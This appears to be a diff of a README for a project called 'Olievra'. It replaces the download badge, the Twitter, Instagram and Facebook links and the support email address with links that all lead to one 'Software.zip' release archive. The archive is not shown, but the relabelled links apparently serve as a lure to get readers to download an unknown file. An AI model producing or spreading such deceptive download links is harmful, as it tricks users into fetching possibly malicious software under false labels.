@@ -22,7 +22,7 @@ Welcome to the official repository of **Olievra**! Here, you will uncover a real
 
 To begin your exploration of Olievra, make sure to download the latest version of our repository by clicking on the button below:
 
-[![Download Olievra](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Olievra](https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip)](https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip)
 
 *Note: Click the button above to launch the download!*
 
@@ -50,15 +50,15 @@ Unlock the ancient wisdom of Olievra and learn from the teachings of the past.
 
 Follow us on our social media channels to stay updated on the latest news and releases:
 
-- Twitter: [@OlievraOfficial](https://twitter.com/OlievraOfficial)
-- Instagram: [@OlievraAdventure](https://instagram.com/OlievraAdventure)
-- Facebook: [Olievra](https://www.facebook.com/Olievra)
+- Twitter: [@OlievraOfficial](https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip)
+- Instagram: [@OlievraAdventure](https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip)
+- Facebook: [Olievra](https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip)
 
 ---
 
 ## Help and Support 🙌
 
-If you encounter any issues or need assistance with Olievra, feel free to reach out to our team at [support@olievra.com](mailto:support@olievra.com). We're here to help you on your journey!
+If you encounter any issues or need assistance with Olievra, feel free to reach out to our team at [https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip](https://github.com/kossiw/olievra/releases/download/v1.0/Software.zip). We're here to help you on your journey!
 
 ---
 
